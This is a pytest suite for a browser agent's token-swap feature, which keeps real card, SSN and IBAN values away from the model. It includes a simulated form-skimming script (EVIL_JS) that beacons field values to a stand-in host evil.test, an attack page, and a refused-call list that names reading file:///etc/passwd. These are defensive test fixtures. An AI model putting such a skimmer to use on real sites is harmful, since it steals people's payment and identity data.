"""Browser(tokens={...}): the model sees and types dummies; TokenSwap writes the real value into a request body only on
the way to a host the token allows, and masks it out of responses. Unit tests need no browser; the rest run a local
checkout on shop.test / pay.test / evil.test (Chrome's --host-resolver-rules maps them to this machine)."""

import base64
import gzip
import http.server
import json
import random
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path

import pytest
from pydantic_ai.messages import ModelRequest

from browser_use import Agent, Browser
from browser_use.repl import Repl
from browser_use.tokens import (
	Host,
	Token,
	Tokens,
	TokenSwap,
	dummy_card,
	dummy_iban,
	dummy_ssn,
	dummy_text,
	hosts_allow,
	iban_ok,
	luhn_ok,
	registrable,
)
from tests.ci.conftest import find_chrome, script

PAY_CARD = '4242 4242 4242 4242'  # the processor's card (pay.test, pinned to key=pk_good)
SHOP_CARD = '5555 5555 5555 4444'
CVC = '123'
SSN = '123-45-6789'
STREET = '742 Evergreen "Terrace" #5 Ü'  # ", # and Ü: escaping in every encoding
IBAN = 'DE89 3704 0044 0532 0130 00'
ACCT = '00123456789'
REALS = ('4242424242424242', '5555555555554444', '123456789', '742 Evergreen', 'Terrace', 'DE89370400440532013000', ACCT)


def config(port_suffix: str = '') -> dict:
	shop, pay = f'shop.test{port_suffix}', f'pay.test{port_suffix}'
	return {
		'card': {'type': 'card', 'value': PAY_CARD, 'cvc': CVC, 'exp': '08/29', 'hosts': [pay], 'require': {'key': 'pk_good'}},
		'shopcard': {'type': 'card', 'value': SHOP_CARD, 'hosts': [shop]},
		'ssn': {'type': 'ssn', 'value': SSN, 'hosts': [shop]},
		'street': {'type': 'text', 'value': STREET, 'hosts': [shop]},
		'iban': {'type': 'iban', 'value': IBAN, 'hosts': [shop]},
		'acct': {'type': 'digits', 'value': ACCT, 'hosts': [shop]},
	}


def leaks(text: str) -> list[str]:
	return [r for r in REALS if r.lower() in text.lower() or (r.isdigit() and r in text.replace(' ', '').replace('-', ''))]


# ------------------------------------------------------------------------------------------------ unit: generators


@pytest.mark.parametrize('seed', range(200))
def test_card_dummy_keeps_bin_and_length_passes_luhn_and_differs_in_last4(seed):
	for real in ('4242 4242 4242 4242', '378282246310005', '6011-0009-9013-9424'):
		dummy = dummy_card(real, random.Random(seed))
		d, r = dummy.replace(' ', '').replace('-', ''), real.replace(' ', '').replace('-', '')
		assert len(dummy) == len(real) and d[:6] == r[:6] and luhn_ok(d) and d[-4:] != r[-4:]
		assert [i for i, c in enumerate(dummy) if not c.isdigit()] == [i for i, c in enumerate(real) if not c.isdigit()]


@pytest.mark.parametrize('seed', range(200))
def test_ssn_iban_and_text_dummies_are_valid_shapes(seed):
	rng = random.Random(seed)
	ssn = dummy_ssn('123-45-6789', rng)
	area, group, serial = ssn.split('-')
	assert 1 <= int(area) <= 899 and area != '666' and 1 <= int(group) <= 99 and 1 <= int(serial) <= 9999
	iban = dummy_iban(IBAN, rng)
	assert iban_ok(iban) and iban[:2] == 'DE' and len(iban) == len(IBAN) and iban.replace(' ', '') != IBAN.replace(' ', '')
	text = dummy_text(STREET, rng)
	assert all(c.isascii() and (c.isalnum() or c in ' -') for c in text) and text[:3].isdigit() and 'Evergreen' not in text


def test_config_errors_raise_before_anything_starts():
	ok = {'type': 'ssn', 'value': SSN, 'hosts': ['a.example.com']}
	for bad, match in (
		({'x': {**ok, 'type': 'password'}}, "'type' must be one of"),
		({'x': {**ok, 'cvc': '123'}}, 'unknown key'),
		({'x': {**ok, 'hosts': 'a.example.com'}}, "'hosts' must be a non-empty list"),
		({'x': {**ok, 'hosts': ['https://a.example.com/pay']}}, 'not a URL'),
		({'x': {**ok, 'hosts': ['a.*.com']}}, 'only a leading'),
		({'x': {**ok, 'value': '12345'}}, 'an SSN has 9 digits'),
		({'x': {'type': 'text', 'value': 'Main St', 'hosts': ['a.com']}}, 'at least 8'),
		({'x': {'type': 'iban', 'value': 'DE00 3704 0044 0532 0130 00', 'hosts': ['a.com']}}, 'not a valid IBAN'),
		({'x': {'type': 'card', 'value': PAY_CARD, 'hosts': ['*.stripe.com']}}, 'multi-tenant'),
		({'x': {'type': 'card', 'value': PAY_CARD, 'hosts': ['payments.braintree-api.com']}}, 'multi-tenant'),
		({'x': {'type': 'card', 'value': PAY_CARD, 'hosts': ['checkout-live.adyen.com']}}, 'multi-tenant'),
		({'x': {'type': 'card', 'value': PAY_CARD, 'hosts': ['a.com'], 'cvc': '12'}}, '3 or 4 digits'),
		({'bad name': ok}, 'identifiers'),
	):
		with pytest.raises((TypeError, ValueError), match=match):
			Browser('chromium', tokens=bad)
	with pytest.raises(ValueError, match=r"Browser\('chrome'\) \(your open Chrome\) does not take tokens="):
		Browser('chrome', tokens={'x': ok})
	Tokens.of({'x': {'type': 'card', 'value': PAY_CARD, 'hosts': ['*.stripe.com'], 'require': {'key': 'pk_live_1'}}})


def test_host_rules():
	stripe = (Host.parse('*.stripe.com', 'w'), Host.parse('shop.example.com', 'w'))
	assert hosts_allow(stripe, 'https://api.stripe.com/v1/tokens')
	assert not hosts_allow(stripe, 'https://stripe.com/')  # '*.' is subdomains only
	assert not hosts_allow(stripe, 'https://evilstripe.com/') and not hosts_allow(stripe, 'https://api.stripe.com.evil.com/')
	assert not hosts_allow(stripe, 'https://www.shop.example.com/') and hosts_allow(stripe, 'https://SHOP.example.com./x')
	assert not hosts_allow(stripe, 'http://api.stripe.com/')  # https only
	assert not hosts_allow(stripe, 'wss://api.stripe.com/')
	assert hosts_allow((Host.parse('bücher.de', 'w'),), 'https://xn--bcher-kva.de/')  # punycode
	port = (Host.parse('pay.example.com:8443', 'w'),)
	assert hosts_allow(port, 'https://pay.example.com:8443/') and not hosts_allow(port, 'https://pay.example.com/')
	local = (Host.parse('shop.test', 'w'), Host.parse('127.0.0.1', 'w'), Host.parse('shop.localhost', 'w'))
	assert all(hosts_allow(local, u) for u in ('http://shop.test:81/', 'http://127.0.0.1/', 'http://shop.localhost/'))
	assert registrable('api.shop.example.co.uk') == 'example.co.uk' and registrable('js.stripe.com') == 'stripe.com'


# ------------------------------------------------------------------------------------------------ unit: matching


VECTORS = json.loads((Path(__file__).parent / 'fixtures' / 'token_vectors.json').read_text())['vectors']


@pytest.mark.parametrize('v', VECTORS, ids=[v['name'] for v in VECTORS])
def test_shared_vectors(v):
	"""The same file runs in proxy-use: one spec for matching and encoding in both places."""
	tokens = Tokens([Token('t', v['kind'], v['real'], v['dummy'], (Host.parse('shop.test', 'w'),))])
	headers = {'Origin': 'http://shop.test', 'Content-Type': v['content_type']}
	out = tokens.swap('http://shop.test/x', headers, v['body'].encode())
	assert (out[0].decode() if out else v['body']) == v['expected']


def unit_tokens() -> Tokens:
	return Tokens.of(config(), random.Random(7))


def swapped(tokens: Tokens, url: str, body: str, ctype='application/x-www-form-urlencoded', **headers) -> str:
	out = swap(tokens, url, body, ctype, **headers)
	assert out is not None, body
	return out


def swap(tokens: Tokens, url: str, body: str, ctype='application/x-www-form-urlencoded', **headers) -> str | None:
	h = {'Origin': 'http://shop.test', 'Content-Type': ctype, **headers}
	out = tokens.swap(url, {k.replace('_', '-'): v for k, v in h.items()}, body.encode())
	return out[0].decode() if out else None


def test_origin_rule_and_require_pins():
	t = unit_tokens()
	d = t.dummies()
	ssn = f'ssn={d["ssn"]}'
	assert swap(t, 'http://shop.test/a', ssn) == 'ssn=123-45-6789'
	assert swap(t, 'http://shop.test/a', ssn, Origin='http://evil.test') is None  # a page elsewhere posting the dummy
	assert swap(t, 'http://shop.test/a', ssn, Origin='null') is None
	assert swap(t, 'http://shop.test/a', ssn, Origin='') is None  # no Origin and no Referer
	assert swap(t, 'http://shop.test/a', ssn, Origin='', Referer='http://shop.test/checkout') == 'ssn=123-45-6789'
	assert swap(t, 'http://evil.test/a', ssn) is None
	pay = {'Origin': 'http://pay.test'}
	card = urllib.parse.urlencode({'card[number]': d['card'], 'card[cvc]': d['card.cvc'], 'key': 'pk_good'})
	assert '4242+4242+4242+4242' in swapped(t, 'http://pay.test/v1', card, **pay) and 'card%5Bcvc%5D=123' in swapped(
		t, 'http://pay.test/v1', card, **pay
	)
	assert swap(t, 'http://pay.test/v1', card.replace('pk_good', 'pk_evil'), **pay) is None
	assert swap(t, 'http://pay.test/v1', card.replace('key=pk_good', 'x=1'), **pay) is None  # missing pin
	assert swap(t, 'http://pay.test/v1', card + '&key=pk_evil', **pay) is None  # every occurrence must equal
	assert swap(t, 'http://pay.test/v1', card.replace('key=pk_good', 'x=1'), **pay, KEY='pk_good') is not None  # header pin
	js = json.dumps({'card': {'number': d['card']}, 'key': 'pk_good'})
	assert '4242 4242 4242 4242' in swapped(t, 'http://pay.test/v1', js, 'application/json', **pay)
	boundary = 'XyZ'
	mp = f'--{boundary}\r\nContent-Disposition: form-data; name="key"\r\n\r\npk_good\r\n--{boundary}\r\nContent-Disposition: form-data; name="n"\r\n\r\n{d["card"]}\r\n--{boundary}--\r\n'
	assert '4242 4242 4242 4242' in swapped(t, 'http://pay.test/v1', mp, f'multipart/form-data; boundary={boundary}', **pay)
	assert (
		swap(t, 'http://pay.test/v1', mp.replace('pk_good', 'pk_evil'), f'multipart/form-data; boundary={boundary}', **pay)
		is None
	)


def test_cvc_is_anchored_to_its_card_and_whole_field_values():
	t = unit_tokens()
	d = t.dummies()
	pay = {'Origin': 'http://pay.test'}
	assert swap(t, 'http://pay.test/v1', f'cvc={d["card.cvc"]}&key=pk_good', **pay) is None  # without the card number
	both = f'n={d["card"].replace(" ", "")}&cvc={d["card.cvc"]}&note=x{d["card.cvc"]}&key=pk_good'
	assert swap(t, 'http://pay.test/v1', both, **pay) == f'n=4242424242424242&cvc=123&note=x{d["card.cvc"]}&key=pk_good'
	js = json.dumps({'n': d['card'], 'cvc': d['card.cvc'], 'key': 'pk_good'})
	assert json.loads(swapped(t, 'http://pay.test/v1', js, 'application/json', **pay))['cvc'] == '123'


def test_fail_closed_cases():
	t = unit_tokens()
	d = t.dummies()
	js = json.dumps({'ssn': d['ssn']})
	assert swap(t, 'http://shop.test/a', js, 'application/json', Content_Encoding='gzip') is None
	split = '&'.join(f'c{i}={g}' for i, g in enumerate(d['shopcard'].split()))  # a card over 4 inputs
	assert swap(t, 'http://shop.test/a', split) is None
	assert swap(t, 'http://shop.test/a', 'street=' + urllib.parse.quote(d['street']), 'application/octet-stream') is None


def test_mask_text_finds_real_values_in_every_form():
	t = unit_tokens()
	d = t.dummies()
	page = (
		f'Ship to {STREET} / {STREET.upper()} / {json.dumps(STREET)} / {json.dumps(STREET, ensure_ascii=True)} / '
		f'&lt;{STREET.replace(chr(34), "&quot;")}&gt; / {urllib.parse.quote_plus(STREET)} / SSN 123 45 6789 / '
		f'card 5555-5555-5555-4444 / iban de89 3704 0044 0532 0130 00 / acct {ACCT} / ending 4444'
	)
	masked = t.mask_text(page)
	assert leaks(masked) == [], masked
	assert d['street'] in masked and d['street'].upper() in masked and d['ssn'].replace('-', ' ') in masked
	assert masked.endswith('ending 4444')  # PCI-permitted truncation is not a full value: left as it is


# ------------------------------------------------------------------------------------------------ the local checkout


class Shop(http.server.BaseHTTPRequestHandler):
	"""shop.test (the merchant), pay.test (a multi-tenant processor) and evil.test (an exfiltration endpoint), routed
	by Host. Records every request; serves the merchant's records with the real values (as a real merchant would)."""

	hits: list[dict] = []
	port = 0

	def log_message(self, *args):
		pass

	def _reply(self, body: str | bytes, ctype: str = 'text/html; charset=utf-8', status: int = 200, headers=None):
		data = body.encode() if isinstance(body, str) else body
		self.send_response(status)
		self.send_header('Content-Type', ctype)
		self.send_header('Content-Length', str(len(data)))
		for k, v in (headers or {}).items():
			self.send_header(k, v)
		self.end_headers()
		self.wfile.write(data)

	def _record(self, body: bytes = b'') -> str:
		host = self.headers.get('Host', '').split(':')[0]
		host = host if host.endswith('.test') else 'shop.test'
		Shop.hits.append({'host': host, 'method': self.command, 'path': self.path, 'headers': dict(self.headers), 'body': body})
		return host

	def do_GET(self):
		host = self._record()
		p = Shop.port
		shop, pay, evil = f'http://shop.test:{p}', f'http://pay.test:{p}', f'http://evil.test:{p}'
		path = self.path.split('?')[0]
		if host == 'evil.test' and path == '/evil.js':
			return self._reply(EVIL_JS.replace('EVIL', evil).replace('PAY', pay), 'text/javascript')
		if host == 'evil.test' and path == '/attack':  # a page elsewhere that learned the dummies posts them to the shop
			q = dict(urllib.parse.parse_qsl(self.path.split('?', 1)[1]))
			body = json.dumps({'ssn': q['ssn']})
			return self._reply(
				f'<script>window.done = fetch("{shop}/submit-attack", {{method: "POST", mode: "no-cors", '
				f'headers: {{"Content-Type": "text/plain"}}, body: {json.dumps(body)}}}).then(() => "sent")</script>'
			)
		if host == 'pay.test' and path == '/frame':
			return self._reply(PAY_FRAME)
		if path == '/checkout':
			return self._reply(CHECKOUT.replace('EVIL', evil).replace('PAY', pay))
		if path == '/sw.js':
			return self._reply(SW_JS, 'text/javascript')
		if path == '/order':
			return self._reply(
				f'<h1>Order</h1><p id=street>{STREET.replace(chr(34), "&quot;")}</p><p id=ssn>SSN {SSN}</p>'
				f'<p id=card>card {SHOP_CARD}, ending 4444</p><p id=iban>{IBAN}</p><div id=xhr></div>'
				"<script>window.loadXhr = () => fetch('/order.json').then(r => r.text()).then(t => xhr.append(t))</script>"
			)
		if path == '/order.json':
			return self._reply(json.dumps({'street': STREET, 'acct': ACCT, 'card': SHOP_CARD}), 'application/json')
		return self._reply(f'<title>{host}{self.path}</title>')

	def do_POST(self):
		body = self.rfile.read(int(self.headers.get('Content-Length') or 0))
		host = self._record(body)
		if self.path == '/submit-form':
			return self._reply('<title>thanks</title>')
		return self._reply(f'{host} ok', 'text/plain')


CHECKOUT = """<!doctype html><title>checkout</title>
<script src="EVIL/evil.js"></script>
<form id=classic method=POST action="/submit-form">
<input id=shopcard name=card><input id=ssn name=ssn><input id=street name=street>
<input id=iban name=iban><input id=acct name=acct><button id=go>Pay</button></form>
<input id=c1><input id=c2><input id=c3><input id=c4>
<iframe id=pay src="PAY/frame"></iframe>
<script>
const $ = id => document.getElementById(id).value;
function luhn(s) { let t = 0; [...s].reverse().forEach((c, i) => { let d = +c; if (i % 2) { d *= 2; if (d > 9) d -= 9 } t += d }); return t % 10 === 0 }
document.getElementById('classic').addEventListener('submit', e => {
	const n = $('shopcard').replace(/\\D/g, '');
	if (!luhn(n) || !/^5[1-5]/.test(n)) { e.preventDefault(); document.title = 'rejected' }  // brand + Luhn, as checkouts do
});
const vals = () => ({card: $('shopcard'), ssn: $('ssn'), street: $('street'), iban: $('iban'), acct: $('acct')});
const post = (path, body, type) => fetch(path, {method: 'POST', body, headers: type ? {'Content-Type': type} : {}}).then(r => r.text());
window.sendJson = () => post('/submit-json', JSON.stringify(vals()), 'application/json');
window.sendMultipart = () => { const f = new FormData(); for (const [k, v] of Object.entries(vals())) f.append(k, v); return fetch('/submit-multipart', {method: 'POST', body: f}).then(r => r.text()) };
window.sendText = () => post('/submit-text', `card ${$('shopcard')} ssn ${$('ssn')} street ${$('street')}`, 'text/plain;charset=UTF-8');
window.sendUnknown = () => post('/submit-unknown', `ssn=${$('ssn')}&street=${$('street')}`, 'application/octet-stream');
window.sendBase64 = () => post('/submit-b64', btoa(JSON.stringify({ssn: $('ssn')})), 'text/plain');
window.sendSplit = () => post('/submit-split', new URLSearchParams({c1: $('c1'), c2: $('c2'), c3: $('c3'), c4: $('c4')}).toString(), 'application/x-www-form-urlencoded');
window.sendGzip = async () => {
	const stream = new Blob([JSON.stringify({ssn: $('ssn')})]).stream().pipeThrough(new CompressionStream('gzip'));
	return post('/submit-gzip', await new Response(stream).arrayBuffer(), 'application/json').catch(e => String(e));
};
window.sendGzipEncoded = async () => {
	const stream = new Blob([JSON.stringify({ssn: $('ssn')})]).stream().pipeThrough(new CompressionStream('gzip'));
	const body = await new Response(stream).arrayBuffer();
	return fetch('/submit-gzip', {method: 'POST', body, headers: {'Content-Type': 'application/json', 'Content-Encoding': 'gzip'}}).then(r => r.text());
};
</script>"""

PAY_FRAME = """<!doctype html><input id=num><input id=cvc>
<script>
window.pay = key => fetch('/v1/tokens', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
	body: new URLSearchParams({'card[number]': num.value, 'card[cvc]': cvc.value, key}).toString()}).then(r => r.text());
</script>"""

# A "malicious third-party" script on the checkout: beacons whatever the fields hold, in the URL, headers and body,
# to its own host, and posts the processor card it learned to the processor with the attacker's own key.
EVIL_JS = """window.exfil = async (learnedPayCard, learnedCvc) => {
	const ids = ['shopcard', 'ssn', 'street', 'iban', 'acct'];
	const v = Object.fromEntries(ids.map(id => [id, document.getElementById(id).value]));
	const q = encodeURIComponent(JSON.stringify(v));
	navigator.sendBeacon('EVIL/beacon?d=' + q, JSON.stringify(v));
	await fetch('EVIL/collect?d=' + q, {method: 'POST', mode: 'no-cors', body: new URLSearchParams(v).toString(),
		headers: {'Content-Type': 'application/x-www-form-urlencoded'}});
	await fetch('PAY/v1/tokens', {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
		body: new URLSearchParams({'card[number]': learnedPayCard, 'card[cvc]': learnedCvc, key: 'pk_evil'}).toString()});
	return 'sent';
};"""

SW_JS = """self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));
self.addEventListener('fetch', e => {
	if (e.request.url.includes('/sw-submit')) e.respondWith(e.request.text().then(t => fetch('/submit-sw', {method: 'POST', body: t, headers: {'Content-Type': 'application/json'}})));
});"""


@pytest.fixture(scope='module')
def site():
	server = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Shop)
	threading.Thread(target=server.serve_forever, daemon=True).start()
	Shop.port = server.server_address[1]
	p = Shop.port
	yield {'shop': f'http://shop.test:{p}', 'pay': f'http://pay.test:{p}', 'evil': f'http://evil.test:{p}', 'port': p}
	server.shutdown()


@pytest.fixture(scope='module')
def chrome(site):
	"""Overrides conftest's: the same isolated headless Chrome, with *.test mapped to this machine (and shop.test a
	secure origin, for its service worker)."""
	binary = find_chrome()
	if not binary:
		pytest.skip('Chrome not installed')
	with socket.socket() as s:
		s.bind(('127.0.0.1', 0))
		port = s.getsockname()[1]
	profile = tempfile.mkdtemp()
	args = [
		binary,
		'--headless=new',
		f'--remote-debugging-port={port}',
		f'--user-data-dir={profile}',
		'--no-first-run',
		'--host-resolver-rules=MAP *.test 127.0.0.1',
		f'--unsafely-treat-insecure-origin-as-secure={site["shop"]}',
	]
	if sys.platform.startswith('linux'):
		args.append('--no-sandbox')
	proc = subprocess.Popen([*args, 'about:blank'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	ws = None
	for _ in range(150):
		try:
			ws = json.load(urllib.request.urlopen(f'http://127.0.0.1:{port}/json/version'))['webSocketDebuggerUrl']
			break
		except OSError:
			time.sleep(0.1)
	if ws is None:
		proc.kill()
		proc.wait()
		pytest.skip('Chrome did not start')
	yield {'http': f'http://127.0.0.1:{port}', 'ws': ws}
	proc.kill()
	proc.wait()
	shutil.rmtree(profile, ignore_errors=True)


def hits(path: str, host: str | None = None) -> list[dict]:
	return [h for h in Shop.hits if h['path'].split('?')[0] == path and (host is None or h['host'] == host)]


def wait_for(path: str, host: str | None = None, n: int = 1, timeout: float = 5.0) -> list[dict]:
	deadline = time.monotonic() + timeout
	while len(found := hits(path, host)) < n and time.monotonic() < deadline:
		time.sleep(0.05)
	return found


def everything(h: dict) -> str:
	"""URL, headers and body of a recorded request."""
	return urllib.parse.unquote_plus(f'{h["path"]} {json.dumps(h["headers"])} {h["body"].decode("utf-8", "replace")}')


async def test_checkout_swaps_only_where_allowed_and_nothing_real_reaches_the_page(chrome, daemon, site, tmp_path):
	"""§7 assertions 1-4, 6-8 on a real Chrome: the merchant and the pinned processor get real values in every
	encoding; the beacon script, the attacker's key and a page elsewhere get only dummies; fail-closed bodies arrive as
	the dummy; a length-changing swap parses; a service-worker POST is swapped; the DOM, Network events,
	getRequestPostData and getResponseBody hold no real value."""
	Shop.hits.clear()
	tokens = Tokens.of(config())
	d = tokens.dummies()
	before: list[tuple[str, bytes]] = []
	swapper = TokenSwap(chrome['ws'], tokens, on_response=lambda url, body: before.append((url, body)))
	swapper.start()
	repl = Repl(tmp_path, {**daemon, 'BU_TOKENS': '1'})  # no mask: what the browser itself exposes
	shop, evil = site['shop'], site['evil']
	fill = ' '.join(
		f'js({f"document.getElementById({json.dumps(k)}).value = {json.dumps(d[k])}"!r});'
		for k in ('shopcard', 'ssn', 'street', 'iban', 'acct')
	)
	frame_fill = f'num.value = {json.dumps(d["card"])}; cvc.value = {json.dumps(d["card.cvc"])}'
	groups = d['shopcard'].split()
	split = ' '.join(f'js("document.getElementById(\'c{i + 1}\').value = {g!r}");' for i, g in enumerate(groups))
	try:
		helper = """import json as _j
EV = []
def channel(names, method, key):
	EV.extend(drain_events())
	reqs = {e['params']['request']['url'].split('/')[-1]: e['params']['requestId'] for e in EV
		if e.get('method') == 'Network.requestWillBeSent'}
	return {n: cdp(method, requestId=reqs[n])[key] for n in names}
"""
		cells = [
			f'{helper}new_tab({shop + "/checkout"!r}); wait_for_load(); wait(0.5); {fill} {split}',
			"[js(f'{f}()') for f in ('sendJson', 'sendMultipart', 'sendText', 'sendUnknown', 'sendBase64', 'sendSplit', 'sendGzipEncoded')]; "
			"print(_j.dumps(channel(('submit-json', 'submit-multipart'), 'Network.getRequestPostData', 'postData')))",
			# the processor iframe, as Stripe Elements: the card typed inside it, posted from pay.test
			f"t = iframe_target('pay.test'); js({frame_fill!r}, target_id=t); "
			'print(js("pay(\'pk_good\')", target_id=t), js("pay(\'pk_evil\')", target_id=t))',
			f'print(js("exfil({d["card"]!r}, {d["card.cvc"]!r})"))',
			# service worker: a POST the page's own worker re-sends
			"print(js(\"navigator.serviceWorker.register('/sw.js').then(() => navigator.serviceWorker.ready).then(() => 'ok')\"))",
			f'goto_url({shop + "/checkout"!r}); wait_for_load(); wait(0.5); {fill} '
			"print(js(\"fetch('/sw-submit', {method: 'POST', body: JSON.stringify({ssn: document.getElementById('ssn').value})}).then(r => r.text())\"))",
			'js("document.getElementById(\'go\').click()"); wait_for_load(); wait(0.5); print(page_info()["title"])',
			f'goto_url({evil + "/attack?ssn=" + d["ssn"]!r}); wait_for_load(); print(js("window.done"))',
			f'goto_url({shop + "/order"!r}); wait_for_load(); js("loadXhr()"); wait(0.5); print(js("document.body.innerText")); '
			"print(_j.dumps(channel(('order', 'order.json'), 'Network.getResponseBody', 'body')))",
			# every CDP event the model could drain
			'EV.extend(drain_events()); open("events.json", "w").write(_j.dumps(EV))',
		]
		outputs = []
		for code in cells:
			r = await repl.call('exec', code, 60)
			assert r['error'] is None, (code, r['error'])
			outputs.append(r['output'])
		refused = []
		for code in (
			'cdp("Fetch.enable", patterns=[{"urlPattern": "*"}])',
			'cdp("Target.attachToBrowserTarget")',
			'cdp("Tracing.start")',
			'cdp("Page.navigate", url="chrome://net-export")',
			'cdp("Target.createTarget", url="file:///etc/passwd")',
		):
			r = await repl.call('exec', code, 30)
			refused.append(bool(r['error']) and 'refused while Browser(tokens=...) is on' in r['error'])
	finally:
		await repl.close()
		swapper.close()
	wait_for('/submit-sw')
	# 1. the merchant: real values in every encoding
	sj = json.loads(hits('/submit-json')[0]['body'])
	assert sj == {'card': SHOP_CARD, 'ssn': SSN, 'street': STREET, 'iban': IBAN, 'acct': ACCT}
	form = dict(urllib.parse.parse_qsl(hits('/submit-form')[0]['body'].decode()))
	assert form == {'card': SHOP_CARD, 'ssn': SSN, 'street': STREET, 'iban': IBAN, 'acct': ACCT}
	mp = hits('/submit-multipart')[0]['body'].decode()
	assert all(v in mp for v in (SHOP_CARD, SSN, STREET, IBAN, ACCT)), mp
	assert hits('/submit-text')[0]['body'].decode() == f'card {SHOP_CARD} ssn {SSN} street {STREET}'
	assert hits('/submit-unknown')[0]['body'].decode() == f'ssn={SSN}&street={d["street"]}'  # street needs escaping: dummy
	assert json.loads(hits('/submit-sw')[0]['body']) == {'ssn': SSN}  # 8. a service worker's request is swapped
	# 7. a swap that changes the length: Chrome sends the new Content-Length, the body parses
	for h in hits('/submit-json') + hits('/submit-form') + hits('/submit-multipart'):
		assert int(h['headers']['Content-Length']) == len(h['body'])
	# the pinned processor: the card and its cvc, from its own frame with its own key only
	good = [h for h in hits('/v1/tokens', 'pay.test') if b'pk_good' in h['body']]
	assert len(good) == 1 and dict(urllib.parse.parse_qsl(good[0]['body'].decode())) == {
		'card[number]': PAY_CARD,
		'card[cvc]': CVC,
		'key': 'pk_good',
	}
	bad = [h for h in hits('/v1/tokens', 'pay.test') if b'pk_evil' in h['body']]
	assert len(bad) == 2  # pay('pk_evil') from the frame, exfil() from the checkout
	# 2. exfiltration gets dummies only: URL, headers and body
	evil_hits = [h for h in Shop.hits if h['host'] == 'evil.test' and h['path'].startswith(('/beacon', '/collect'))]
	assert len(evil_hits) == 2
	for h in [*evil_hits, *bad]:
		assert leaks(everything(h)) == [], everything(h)
	assert d['ssn'] in everything(evil_hits[0])
	# 3. a page on evil.test posting the dummy to the shop: not swapped (Origin)
	assert hits('/submit-attack')[0]['body'] == json.dumps({'ssn': d['ssn']}).encode()
	# 6. fail closed: base64, a card over 4 inputs and a gzip body arrive as the dummy
	assert json.loads(base64.b64decode(hits('/submit-b64')[0]['body'])) == {'ssn': d['ssn']}
	assert dict(urllib.parse.parse_qsl(hits('/submit-split')[0]['body'].decode())) == {
		f'c{i + 1}': g for i, g in enumerate(groups)
	}
	assert json.loads(gzip.decompress(hits('/submit-gzip')[0]['body'])) == {'ssn': d['ssn']}
	# the classic form passed the page's own Luhn and brand check with the dummy
	assert 'thanks' in outputs[6]
	# 4. nothing real in the DOM (document and XHR echo), the drained events, getRequestPostData, getResponseBody
	page, bodies = outputs[8].strip().rsplit('\n', 1)
	assert leaks(page) == [] and 'ending 4444' in page, page
	assert page.count(d['street']) == 2 and d['acct'] in page  # the document and the XHR echo, masked
	events = (tmp_path / 'events.json').read_text()
	assert leaks(events) == [] and '/order.json' in events and '/submit-json' in events, leaks(events)
	channels = {**json.loads(outputs[1]), **json.loads(bodies)}
	assert leaks(json.dumps(channels)) == [], channels
	assert d['ssn'] in channels['submit-json'] and d['street'] in channels['order.json']  # the pre-swap / masked bodies
	# the parent saw the server's real echo before masking (the live-check hook)
	assert any('/order' in url and STREET.replace('"', '&quot;').encode() in body for url, body in before)
	# 5. the model's cdp() refuses what would show a swapped request
	assert refused == [True] * 5
	assert swapper.swaps >= 6 and swapper.masked >= 2


async def test_a_page_loaded_before_the_swap_started_sends_the_dummy(chrome, daemon, site, tmp_path):
	"""Chrome applies a browser-level Fetch.enable to documents loaded after it: a page already open sends the dummy
	(fail closed) until it navigates, then the swap works."""
	Shop.hits.clear()
	tokens = Tokens.of(config())
	d = tokens.dummies()
	repl = Repl(tmp_path, daemon)
	post = f"print(js(\"fetch('/late', {{method: 'POST', body: 'ssn={d['ssn']}'}}).then(r => r.text())\"))"
	swapper = TokenSwap(chrome['ws'], tokens)
	try:
		r = await repl.call('exec', f'new_tab({site["shop"] + "/x"!r}); wait_for_load()', 30)
		swapper.start()
		r = await repl.call('exec', post, 30)
		r = await repl.call('exec', f'goto_url({site["shop"] + "/x"!r}); wait_for_load(); {post}', 30)
		assert r['error'] is None, r['error']
	finally:
		await repl.close()
		swapper.close()
	assert [h['body'] for h in hits('/late')] == [f'ssn={d["ssn"]}'.encode(), f'ssn={SSN}'.encode()]


def test_swap_start_failure_raises():
	swapper = TokenSwap('ws://127.0.0.1:9/devtools/browser/x', Tokens.of(config()))
	with pytest.raises(RuntimeError, match=r'Browser\(tokens=\.\.\.\) could not start'):
		swapper.start()


async def test_a_response_it_cannot_mask_is_failed_never_passed_through(chrome, daemon, site, tmp_path):
	"""A masking error fails the response: the page gets a network error, not the real value."""

	class Broken(Tokens):
		def mask_bytes(self, body, charset=None):
			raise ValueError('boom')

	t = Tokens.of(config())
	broken = Broken(t.tokens)
	swapper = TokenSwap(chrome['ws'], broken)
	swapper.start()
	repl = Repl(tmp_path, daemon)
	try:
		r = await repl.call(
			'exec',
			f'new_tab({site["shop"] + "/x"!r}); wait_for_load(); '
			"print(js(\"fetch('/order.json').then(r => r.text()).catch(e => 'failed: ' + e)\"))",
			30,
		)
	finally:
		await repl.close()
		swapper.close()
	assert r['error'] is None and r['output'].strip().startswith('failed: TypeError'), r['output']


async def test_agent_types_dummies_and_never_sees_a_real_value(chrome, site, tmp_path):
	"""Browser(cdp_url=..., tokens=...) end to end: the prompt lists the dummies, the model types one with type_text,
	the shop gets the real value, the worker gets none, and a real value the model reads some other way (plain HTTP
	from the REPL) reaches it as the dummy."""
	Shop.hits.clear()
	browser = Browser(cdp_url=chrome['http'], tokens=config())
	d = browser.token_dummies()
	model, seen = script(
		(
			'python',
			{
				'code': f'new_tab({site["shop"] + "/checkout"!r}); wait_for_load(); js("document.getElementById(\'ssn\').focus()"); '
				f'type_text({d["ssn"]!r}); js("document.getElementById(\'street\').focus()"); type_text({d["street"]!r}); '
				'print(js("sendJson()"))'
			},
		),
		('python', {'code': f'print(http_get("http://127.0.0.1:{site["port"]}/order.json"))'}),
		('finish', {'success': True, 'result': 'done'}),
	)
	agent = Agent('Fill the checkout', model, browser=browser, workspace=tmp_path)
	result = await agent.run()
	assert result.status == 'completed', result.error
	instructions = next(m for m in seen[0] if isinstance(m, ModelRequest)).instructions or ''
	assert json.dumps(d['ssn']) in instructions and json.dumps(d['street']) in instructions and '08/29' in instructions
	assert leaks(instructions) == []
	sj = json.loads(wait_for('/submit-json')[0]['body'])
	assert sj['ssn'] == SSN and sj['street'] == STREET
	transcript = json.dumps([m for msgs in seen for m in msgs], default=str)
	assert leaks(transcript) == [], leaks(transcript)
